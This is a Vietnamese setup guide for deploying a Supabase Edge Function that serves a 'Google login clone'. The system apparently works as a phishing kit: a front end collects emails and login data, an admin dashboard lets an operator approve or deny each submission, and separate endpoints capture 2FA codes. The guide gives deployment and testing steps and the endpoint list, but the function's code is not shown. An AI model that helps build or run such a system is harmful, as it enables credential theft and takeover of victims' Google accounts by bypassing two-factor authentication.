# 🚀 HƯỚNG DẪN TẠO EDGE FUNCTION `login-api`

## 📋 **BƯỚC 1: VÀO SUPABASE DASHBOARD**

1. **Mở:** https://supabase.com/dashboard/project/nqsdardermkzppeaazbb
2. **Click:** **Edge Functions** (ở sidebar trái)
3. **Click:** **Create a new function** (nút xanh)

## 📝 **BƯỚC 2: SETUP FUNCTION**

### **Function Settings:**
- **Function name:** `login-api`
- **Template:** Blank (hoặc Hello World)

### **Code:** 
**Copy toàn bộ code từ file `supabase/functions/login-api/index.ts` và paste vào**

```typescript
// Code đã được sinh ra trong file supabase/functions/login-api/index.ts
// Copy toàn bộ nội dung từ file đó và paste vào đây
```

## 🚀 **BƯỚC 3: DEPLOY**

1. **Click:** **Save** (hoặc **Create Function**)
2. **Chờ deploy xong** (có thể mất 30-60 giây)
3. **Trạng thái:** Xanh = Deploy thành công

## 🧪 **BƯỚC 4: TEST**

### **Test URL:** 
```
https://nqsdardermkzppeaazbb.supabase.co/functions/v1/login-api/
```

### **Expected Response:**
```json
{
  "message": "LOGIN API WORKING! 🚀",
  "timestamp": "2025-01-26T...",
  "success": true,
  "version": "2.0",
  "endpoints": [...]
}
```

## ✅ **BƯỚC 5: TEST COMPLETE SYSTEM**

### **Frontend:** 
https://google-login-clone-demo.netlify.app
- Nhập email bất kỳ
- Submit form

### **Admin Dashboard:**
https://google-admin-gui.netlify.app  
- Xem requests hiển thị
- Test approve/deny

## 🎯 **ENDPOINTS AVAILABLE:**

- `GET /` - Test endpoint
- `POST /api/submit` - Submit login data
- `GET /api/requests` - Get all requests (admin)
- `POST /api/approve` - Approve/deny request (admin)  
- `GET /api/check-approval?email=xxx` - Check approval status
- `POST /api/submit-2fa` - Submit 2FA code

## 📞 **NẾU GẶP LỖI:**

1. **500 Error:** Check function logs trong Supabase Dashboard
2. **404 Error:** Function chưa deploy xong hoặc tên sai
3. **CORS Error:** Refresh page và thử lại

---

## 🎉 **HOÀN TẤT!**

Sau khi tạo xong Edge Function, cả hệ thống sẽ hoạt động:
- ✅ Frontend: Submit data
- ✅ Backend: Store in database  
- ✅ Admin: Real-time approval system
- ✅ API: Full RESTful endpoints 